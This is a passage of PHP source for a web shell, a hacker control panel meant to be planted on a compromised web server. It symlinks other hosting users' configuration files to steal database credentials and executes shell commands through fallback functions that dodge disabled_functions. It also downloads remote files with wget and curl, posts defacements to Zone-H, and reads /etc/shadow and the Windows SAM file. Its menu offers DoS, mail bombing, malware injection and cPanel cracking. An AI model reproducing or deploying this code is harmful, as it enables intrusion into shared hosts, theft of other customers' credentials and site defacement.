		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home6/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home6/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home6/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home6/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home6/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home7/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home7/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home7/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home7/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home7/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}
	
	function randomt() 
	{ 
		$chars = "abcdefghijkmnopqrstuvwxyz023456789"; 
		srand((double)microtime()*1000000); 
		$i = 0; 
		$pass = '' ; 
			
		while ($i <= 7) 
		{ 
			$num = rand() % 33; 
			$tmp = substr($chars, $num, 1); 
			$pass = $pass . $tmp; 
			$i++; 
		} 
			
		return $pass; 
	}
	function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1)
	{
		$ar0=explode($marqueurDebutLien, $text);
		$ar1=explode($marqueurFinLien, $ar0[$i]);
		$ar=trim($ar1[0]);
		return $ar;
	}
		
	// Zone-h Poster
	function ZoneH($url, $hacker, $hackmode,$reson, $site )
	{
		$k = curl_init();
		curl_setopt($k, CURLOPT_URL, $url);
		curl_setopt($k,CURLOPT_POST,true);
		curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
		curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
		$kubra = curl_exec($k);
		curl_close($k);
		return $kubra;
	}
	
	// Database functions
	function listdatabase()
	{	
		$self=$_SERVER["PHP_SELF"];
		?>
		<br>
		<form>
		<input type="hidden" name="action" value="createDB">
			<table>
			<tr>
				<td><input type="text" class="box" name="dbname"></td><td><input type="submit" value="  Create Database  " name="createmydb" class="but"></td>
			</tr>
			</table>
		</form>
			<br>
		<?php 
		$mysqlHandle = mysql_connect ($_COOKIE['dbserver'], $_COOKIE['dbuser'], $_COOKIE['dbpass']);
		$result = mysql_query("SHOW DATABASE"); 
		echo "<table cellspacing=1 cellpadding=5 border=1 class=pwdtbl style=width:60%;>\n";

		$pDB = mysql_list_dbs( $mysqlHandle );
		$num = mysql_num_rows( $pDB );
		for( $i = 0; $i < $num; $i++ ) 
		{
			$dbname = mysql_dbname( $pDB, $i );
			mysql_select_db($dbname,$mysqlHandle);
			$result = mysql_query("SHOW TABLES"); 
			$num_of_tables = mysql_num_rows($result);
			echo "<tr>\n";
			echo "<td><a href='$self?action=listTables&dbname=$dbname'><font size=3>$dbname</font></a> ($num_of_tables)</td>\n";
			echo "<td><a href='$self?action=listTables&dbname=$dbname'>Tables</a></td>\n";
			echo "<td><a href='$self?action=dropDB&dbname=$dbname&executequery' onClick=\"return confirm('Drop Database \'$dbname\'?')\">Drop</a></td>\n";
			echo "<td><a href='$self?action=dumpDB&dbname=$dbname' onClick=\"return confirm('Dump Database \'$dbname\'?')\">Dump</a></td>\n";
			echo "</tr>\n";
		}
		echo "</table>\n";
		mysql_close($mysqlHandle);
	}
	
	function listtable()
	{
		$self=$_SERVER["PHP_SELF"];
		$dbserver = $_COOKIE["dbserver"];
		$dbuser = $_COOKIE["dbuser"];
		$dbpass = $_COOKIE["dbpass"];
		$dbname = $_GET['dbname'];
		echo "<div><font size=3>[ $dbname ]</font> - <font size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> &nbsp; <a href=$self?logoutdb> <fontclass=txt size=3>[ Log Out ]</font> </a></div>";
		 ?>
		<br><br>
		<form>
		<input type="hidden" name="action" value="createtable">
		<input type="hidden" name="dbname" value="<?php echo $_GET['dbname'];?>">
			<table>
			<tr>
				<td><input type="text" class="box" name="tablename"></td><td><input type="submit" value="  Create Table  " name="createmydb" class="but"></td>
			</tr>
			</table>
		
			<br>
			<form>
			<input type="hidden" value="<?php echo $_GET['dbname']; ?>" name="dbname">
			<input type="hidden" value="<?php echo $_GET['tablename']; ?>" name="tablename">
			<input type="hidden" value="executequery" name="action">
			<table>
				<tr>
					<td><textarea cols="60" rows="7" name="executemyquery" class="box">Execute Query..</textarea></td>
				</tr>
				<tr>
					<td><input type="submit" value="Execute" class="but"></td>
				</tr>
			</table>
			</form>
			
		<?php 
		
		$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
		
		mysql_select_db($dbname);
		$pTable = mysql_list_tables( $dbname );
	
		if( $pTable == 0 ) {
			$msg  = mysql_error();
			echo "<h3>Error : $msg</h3><p>\n";
			return;
		}
		$num = mysql_num_rows( $pTable );
	
		echo "<table cellspacing=1 cellpadding=5 class=pwdtbl border=1 style=width:60%;>\n";
	
		for( $i = 0; $i < $num; $i++ ) 
		{
			$tablename = mysql_tablename( $pTable, $i );
			$result = mysql_query("select * from $tablename");
			$num_rows = mysql_num_rows($result);
			echo "<tr>\n";
			echo "<td>\n";
			echo "<a href='$self?action=viewdata&dbname=$dbname&tablename=$tablename'><font size=3>$tablename</font></a> ($num_rows)\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href='$self?action=viewSchema&dbname=$dbname&tablename=$tablename'>Schema</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href='$self?action=viewdata&dbname=$dbname&tablename=$tablename'>Data</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href='$self?action=empty&dbname=$dbname&tablename=$tablename'>Empty</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href='$self?action=dropTable&dbname=$dbname&tablename=$tablename' onClick=\"return confirm('Drop Table \'$tablename\'?')\">Drop</a>\n";
			echo "</td>\n";
			echo "</tr>\n";
		}
	
		echo "</table></form>";
		mysql_close($mysqlHandle);
		echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> &nbsp; <a href=$self?logoutdb> <font size=3>[ Log Out ]</font> </a></div>";
	}
		
	
	function paramexe($n, $v) 
	{
		$v = trim($v);
		if($v) 
		{
			echo '<span><font size=3>' . $n . ': </font></span>';
			if(strpos($v, "\n") === false)
				echo '<font class=txt size=2>' . $v . '</font><br>';
			else
				echo '<pre class=ml1><font class=txt size=3>' . $v . '</font></pre>';
		}
	}
	
	$dir = getcwd();
	
	if(isset($_GET['dir']))
	{
		$dir = $_GET['dir'];
	}
	
	
	function dis()
	{
		if(!ini_get('disable_functions'))
		{
			echo "None";
		}
		else
		{
			echo @ini_get('disable_functions');
		}
	}
	
	function mycmdexec($cmd)
	{
		 global $disablefunc;
		 $result = "";
		 if (!empty($cmd))
		 {
			  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
			  elseif (($result = "$cmd") !== FALSE) {}
			  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
			  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
			  elseif (is_resource($fp = popen($cmd,"r")))
			  {
			   $result = "";
			   while(!feof($fp)) {$result .= fread($fp,1024);}
			   pclose($fp);
			  }
		 }
		 return $result;
	}
	
	function rrmdir($dir)
	{
		if (is_dir($dir)) // ensures that we actually have a directory
		{
			$objects = scandir($dir); // gets all files and folders inside
			foreach ($objects as $object)
			{
				if ($object != '.' && $object != '..')
				{
					if (is_dir($dir . '/' . $object))
					{
						// if we find a directory, do a recursive call
						rrmdir($dir . '/' . $object);
					}
					else
					{
						// if we find a file, simply delete it
						unlink($dir . '/' . $object);
					}
				}
			}
			// the original directory is now empty, so delete it
			rmdir($dir);
		}
	} 
	
	function godir($dir)
	{
		//echo $dir;
		
		$zip = new ZipArchive();
		$filename= basename($dir) . '.zip';
		// open archive
		if ($zip->open($filename, ZIPARCHIVE::CREATE) !== TRUE) 
		{
			die ("Could not open archive");
		}
		else
			echo "fdg";
		if (is_dir($dir)) // ensures that we actually have a directory
		{
			$objects = scandir($dir); // gets all files and folders inside
			foreach ($objects as $object)
			{
				if ($object != '.' && $object != '..')
				{
					if (is_dir($dir . '\\' . $object))
					{//echo $dir . '/' . $object;
						// if we find a directory, do a recursive call
						godir($dir . '\\' . $object);
					}
					else
					{
						// if we find a file, simply add it
						$zip->addFile($dir . '\\' . $object) or die ("ERROR: Could not add file: $key");
					}
				}
			}
			// the original directory is now empty, so delete it
			$zip->addFile($dir) or die ("ERROR: Could not add file: $key");
		}		
	} 
	
	
				
	function which($pr)
	{ 
		$path = execmd("which $pr"); 
		if(!empty($path)) 
			return trim($path); 
		else 
			return trim($pr); 
	}
	
	function cf($f,$t) 
	{ 
        $w=@fopen($f,"w") or @function_exists('file_put_contents'); 
        if($w)
		{ 
             @fwrite($w,gzinflate(base64_decode($t))) or @fputs($w,gzinflate(base64_decode($t))) or @file_put_contents($f,gzinflate(base64_decode($t))); 
             @fclose($w); 
        }
	}	
			
	function remotedownload($cmd,$url)
	{ 
		$namafile = basename($url); 
		switch($cmd) 
		{ 
			case 'wwget': 
				execmd(which('wget')." ".$url." -O ".$namafile);
				break; 
			case 'wlynx': 
				execmd(which('lynx')." -source ".$url." > ".$namafile);
				break; 
			case 'wfread' : 
				execmd($wurl,$namafile);
				break; 
			case 'wfetch' : 
				execmd(which('fetch')." -o ".$namafile." -p ".$url);
				break; 
			case 'wlinks' : 
				execmd(which('links')." -source ".$url." > ".$namafile);
				break; 
			case 'wget' : 
				execmd(which('GET')." ".$url." > ".$namafile);
				break; 
			case 'wcurl' : 
				execmd(which('curl')." ".$url." -o ".$namafile);
				break; 
			default: 
			break; 
		} 
		return $namafile; 
	}
	
	function magicboom($text)
	{ 
		if (!get_magic_quotes_gpc()) 
			return $text; 
		return stripslashes($text); 
	}

##################################
function execmd($cmd,$d_functions="None")
{
    if($d_functions=="None") 
	{
		$ret=passthru($cmd); 
		return $ret;
	}
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    $d_functions=str_replace(" ","",$d_functions);
    $dis_funcs=explode(",",$d_functions);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("\n",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="shell_exec")
            {
                $ret=@shell_exec($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            {
                $ret=@popen("$cmd",'r');
                if(is_resource($ret))
                {
                    while(@!feof($ret))
                    $read.=@fgets($ret);
                    @pclose($ret);
                    return $read;
                }
                return -1;
            }

            elseif($safe="proc_open")
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}

	function getDisabledFunctions()
	{
		if(!ini_get('disable_functions'))
		{
			return "None";
		}
		else
		{
				return @ini_get('disable_functions');
		}
	}
	
	function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}
	

	function yourip()
	{
		echo $_SERVER["REMOTE_ADDR"];
	}
	function phpver()
	{
		$pv=@phpversion();
		echo $pv;
	}
	function serverip()
	{
		echo getenv('SERVER_ADDR');
	}
	function serverport()
	{
		echo $_SERVER['SERVER_PORT'];
	}
	function  safe()
	{
		global $sm;
		return $sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF";
	}
	function serveradmin()
	{
		echo $_SERVER['SERVER_ADMIN'];
	}
	function systeminfo()
	{
		echo php_uname();
	}
	function curlinfo()
	{
		echo function_exists('curl_version')?("<font class=txt>Enabled</font>"):("Disabled");
	}
	function oracleinfo()
	{
		echo function_exists('ocilogon')?("<font class=txt>Enabled</font>"):("Disabled");
	}
	function mysqlinfo()
	{
		echo function_exists('mysql_connect')?("<font class=txt>Enabled</font>"):("Disabled");
	}
	function mssqlinfo()
	{
		echo function_exists('mssql_connect')?("<font class=txt>Enabled</font>"):("Disabled");
	}
	function postgresqlinfo()
	{
		echo function_exists('pg_connect')?("<font class=txt>Enabled</font>"):("Disabled");
	}
	function softwareinfo()
	{
		echo getenv("SERVER_SOFTWARE");
	}
	function download()
	{
		$frd=$_GET['download'];
		$prd=explode("/",$frd);
		for($i=0;$i<sizeof($prd);$i++)
		{
			$nfd=$prd[$i];
		}
		@ob_clean(); 
	   header("Content-type: application/octet-stream"); 
	   header("Content-length: ".filesize($nfd)); 
	   header("Content-disposition: attachment; filename=\"".$nfd."\";"); 
   	   readfile($nfd);

   	   exit;
	
	}
		
	function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }
	
	function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?>
                <a class="dir" href='<?php echo $self ?>?dir=<?php echo $drive.":\\"; ?>'>
                    <font class="txt"><?php echo $drive.":\\" ?></font>
                </a> 
                <?php
            }
        }
    }
	function diskSpace()
	{
    	echo HumanReadableFilesize(disk_total_space("/"));
	}	
	function freeSpace()
	{
 	   echo HumanReadableFilesize(disk_free_space("/"));
	}
	
	function thiscmd($p) 
	{
		$path = myexe('which ' . $p);
		if(!empty($path))
			return $path;
		return false;
	}

	function split_dir()
	{
		$de=explode("/",getcwd());
		$del=$de[0];
		for($count=0;$count<sizeof($de);$count++)
		{
		$imp=$imp.$de[$count].'/';
			
		echo "<a href=".$self."?open=".$imp.">".$de[$count]."</a> / ";
		}
		
	}
	
	function mysecinfo()
	{
		
		function myparam($n, $v) 
		{
			$v = trim($v);
			if($v) 
			{
				echo '<span>' . $n . ': </span>';
				if(strpos($v, "\n") === false)
					echo '<font class=txt>' . $v . '</font><br>';
				else
					echo '<pre class=ml1><font class=txt>' . $v . '</font></pre>';
			}
		}
	
		myparam('Server software', @getenv('SERVER_SOFTWARE'));
		if(function_exists('apache_get_modules'))
			myparam('Loaded Apache modules', implode(', ', apache_get_modules()));
		myparam('Open base dir', @ini_get('open_basedir'));
		myparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
		myparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
		$temp=array();
		if(function_exists('mysql_get_client_info'))
			$temp[] = "MySql (".mysql_get_client_info().")";
		if(function_exists('mssql_connect'))
			$temp[] = "MSSQL";
		if(function_exists('pg_connect'))
			$temp[] = "PostgreSQL";
		if(function_exists('oci_connect'))
			$temp[] = "Oracle";
		myparam('Supported databases', implode(', ', $temp));
		echo '<br>';
	
		if($GLOBALS['os'] == 'Linux') {
				myparam('Distro : ', myexe("cat /etc/*-release")); 
				myparam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='$self?passwd'>[view]</a>":'no');
				myparam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
				myparam('OS version', @file_get_contents('/proc/version'));
				myparam('Distr name', @file_get_contents('/etc/issue.net'));
				myparam('Where is Perl?', myexe('whereis perl'));
				myparam('Where is Python?', myexe('whereis python'));
				myparam('Where is gcc?', myexe('whereis gcc'));
				myparam('Where is apache?', myexe('whereis apache'));
				myparam('CPU?', myexe('cat /proc/cpuinfo'));
				myparam('RAM', myexe('free -m'));
				myparam('Mount options', myexe('cat /etc/fstab'));
				myparam('User Limits', myexe('ulimit -a'));
				
				
				if(!$GLOBALS['safe_mode']) {
					$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
					$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
					$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
					echo '<br>';
					$temp=array();
					foreach ($userful as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Userful', implode(', ',$temp));
					$temp=array();
					foreach ($danger as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Danger', implode(', ',$temp));
					$temp=array();
					foreach ($downloaders as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Downloaders', implode(', ',$temp));
					echo '<br/>';
					myparam('HDD space', myexe('df -h'));
					myparam('Hosts', @file_get_contents('/etc/hosts'));
					
				}
		} else {
			echo "Password File : <a href=".$_SERVER['PHP_SELF']."?download=" . $_SERVER["WINDIR"]."\\repair\sam><b><font class=txt>Download password file</font></b></a><br>";
			echo "Config Files :  <a href=".$_SERVER['PHP_SELF']."?open=" . $_SERVER["WINDIR"]."\\system32\drivers\etc\hosts><b><font class=txt>[ Hosts ]</font></b></a> &nbsp;<a href=".$_SERVER['PHP_SELF']."?open=" . $_SERVER["WINDIR"]."\\system32\drivers\etc\\networks><b><font class=txt>[ Local Network Map ]</font></b></a> &nbsp;<a href=".$_SERVER['PHP_SELF']."?open=" . $_SERVER["WINDIR"]."\\system32\drivers\etc\lmhosts.sam><b><font class=txt>[ lmhosts ]</font></b></a><br>";
			$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON":"OFF";
			echo "Open Base Dir : <font class=txt>" . $base . "</font><br>";
			myparam('OS Version',myexe('ver'));
			myparam('Account Settings',myexe('net accounts'));
			myparam('User Accounts',myexe('net user'));
		}
		echo '</div>';
	}
	
	
	
	function myexe($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
	
	function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    
    return(htmlspecialchars($output));
    
}

$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"<font class=txt>ON</font>":"OFF";
$etc_passwd=@is_readable("/etc/passwd")?"Yes":"No";
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><span class=headtitle><img src="https://serving.photos.photobox.com/1671369168a3d19cd5c4ff48f83c793d2959da47d9df12194c96d9f006f2e1c246ce9eb9.jpg" border="0" width="1400" height="150"></span></a>

</div>
<hr>
	
<table cellpadding="0" style="width:100%;">
	<tr>
		<td colspan="3" style="width:85%;"><b>System Info :</b> <font class="txt"><?php systeminfo(); ?></></font></td>
		<td style="width:15%;"><a href="<?php $_SERVER['PHP_SELF'];?>?com=info" target="_blank"><font class="txt"><i>Software Info</i></font></a></td>
	</tr>
	<tr>
		<td style="width:85%;" colspan="3"><b>Software :</b> <font class="txt"><?php softwareinfo(); ?></font></td>
		<td style="width:15%;"><b>Server Port :</b> <font class="txt"><?php serverport(); ?></font></td>
	</tr>
	
	<?php if($os != 'Windows' || shell_exec("id") != null) { ?><tr>
		<td style="width:75%;" colspan="3"><b>Uid :</b> <font class="txt"><?php echo shell_exec("id"); ?></font></td>
	</tr><?php } ?>
	<tr>
		<td style="width:20%;"><b>Disk Space :</b> <font class="txt"><?php diskSpace(); ?></font></td>
		<td style="width:20%;"><b>Free Space :</b> <font class="txt"><?php freeSpace(); ?></font></td>
		
		<td style="width:20%;"><b>Server IP :</b> <a href="http://whois.domaintools.com/<?php serverip(); ?>"><font class="txt"><?php serverip(); ?></font></a></td>
		<td style="width:15%;"><b>Your IP :</b> <font class="txt"><a href="http://whois.domaintools.com/<?php yourip(); ?>"><font class="txt"><?php yourip(); ?></font></a></td>
	</tr>
	
	<tr>
		<?php if($os == 'Windows'){ ?><td style="width:15%;"><b>View Directories :</b> <font class="txt"><?php echo showDrives();?></font></td><?php } ?>
		<?php if($os != 'Windows'){ ?><td colspan=2 style="width:20%;"><b>Current Directory :</b> <font color="#009900"><?php 
			$d = str_replace("\\",$directorysperator,$dir);
	if (substr($d,-1) != $directorysperator) {$d .= $directorysperator;}
	$d = str_replace("\\\\","\\",$d);
	$dispd = htmlspecialchars($d);
	$pd = $e = explode($directorysperator,substr($d,0,-1));
	$i = 0;
	foreach($pd as $b)
	{
	 $t = '';
	 $j = 0;
	 foreach ($e as $r)
	 {
	  $t.= $r.$directorysperator;
	  if ($j == $i) {break;}
	  $j++;
	 }
	
	
	$href='dir='.$t;
	
	 echo '<a href="'.$self."?$href\"><b><font class=\"txt\">".htmlspecialchars($b).$directorysperator.'</font></b></a>';
	 $i++;
	}

		?></font></td><?php } ?>
		<td style="width:20%;"><b>Disable functions :</b> <font class="txt"><?php echo getDisabledFunctions(); ?> </font></td>
		<td><b>Safe Mode :</b> <font class=txt><?php echo safe(); ?></font></td>
		
	</tr>
	</table>
	
<div style="float:left;">
	<a href="/"><font style="font-size:14;"> [ Home ] </font></a>&nbsp;
	<a href="javascript:history.back(1)"><font style="font-size:14;"> [ Back ] </font></a>&nbsp;
	<a href="javascript:history.go(1)"><font style="font-size:14;"> [ Forward ] </font></a>&nbsp;
	<a href=""><font style="font-size:14;"> [ Refresh ] </font></a>&nbsp;</div><br><br>
<table border="3" style="border-color:#10445A;" width="100%;" cellpadding="1" cellspacing="8">
	<tr align="center">
		<td class="myfun"><a href="<?php echo $self.'?secinfo'?>"><font class="fun">[ Sec. Info ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?connect'?>"><font class="fun">[ NetSploit ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?injector'?>"><font class="fun">[ Code Inject ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?bypass';?>"><font class="fun">[ Bypasser ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?phpc';?>"><font class="fun">[ PHP ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?exploit'?>"><font class="fun">[ Exploit ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?fuzz'?>"><font class="fun">[ URL Fuzzer ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?symlinkserver'?>"><font class="fun">[ Symlink ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?dos';?>"><font class="fun">[ DoS ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?mailbomb'?>"><font class="fun">[ Mail ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?tools'?>"><font class="fun">[ Tools ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?forum'?>"><font class="fun">[ Forumz ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?zone'?>"><font class="fun">[ Zone-H ]</font></a></td>
	</tr>
	<tr align="center">
		<td class="myfun"><a href="<?php echo $self.'?database'?>"><font class="fun">[ MySQL ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?404'?>"><font class="fun">[ 404 Page ]</font></a></td>
		<td class="myfun"><a href="<?php echo $self.'?malattack&dir='. $dir;?>"><font class="fun">[ Malware Attack ]</a></td>
		<td class="myfun"><a href="<?php echo $self.'?cpanel'?>"><font class="fun">[ Cpanel Crack ]</font></a></td>
